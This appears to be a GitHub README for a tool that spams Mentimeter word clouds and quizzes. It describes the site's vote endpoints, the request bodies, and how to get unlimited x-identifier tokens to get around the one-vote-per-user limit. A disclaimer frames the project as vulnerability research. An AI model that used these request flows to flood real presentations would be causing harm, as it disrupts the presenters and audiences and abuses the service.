# Mentimeter Fun

**Disclaimer:** I made this project for finding vulnerabilities in the Mentimeter website on my own time, and I do not intend to harm Mentimeter or any of its users. 
I hope that the development team can fix these issues, using these examples.

## About this project

With **Mentimeter-Fun**, you can spam a word cloud, mass-join a quiz, or spam any other interactive presentation.

![Menti submit word cloud](https://github.com/mmbaguette/Mentimeter-Fun/blob/main/example%20images/menti%20submit%20sample.PNG?raw=true)

## How it works:

Every time you send a word cloud for example, the site sends a GET request to https://www.menti.com/core/vote-keys/MENTI_ID/series, which returns something like:

```json
{
   "id":"MENTI_ID",
   "vote_key":"VOTE_KEY",
   "name":"My First Presentation",
   "visible":true,
   "tags":null,
   "theme_id":19009,
   "owner_id": 000000,
   "pace":{
      "mode":"presenter",
      "active":"UNIQUE_ID"
   },
}
```

The `UNIQUE_ID` inside `pace -> active`, which indicates the ID of the current slide, is used in https://www.menti.com/core/votes/UNIQUE_ID to send a POST request with the following request data, 
where `question_type` is the name of the current activity, and `vote` is a list of words being sent to the word cloud:

```json
{
  "question_type": "wordcloud",
  "vote": "word1 word2 word3"
}
```

However, in order to prevent to make sure that each user only submits once each presentation, an `x-identifier` header is required. 

```json
{
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
"x-identifier": "IDENTIFIER"
}
```

We can get this identifer token an unlimited number of times using a POST request to https://www.menti.com/core/identifiers with the following headers:

```json
{"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"}
```

Which returns:

```json
{"identifier":"IDENTIFIER"}
```

After sending your POST request with the required `x-identifier` header and the request payload, check your Mentimeter presentation:

![It works menti](https://github.com/mmbaguette/Mentimeter-Fun/blob/main/example%20images/word%20cloud%20sample.png?raw=true)

You can do this an unlimited amount of times, super quick.
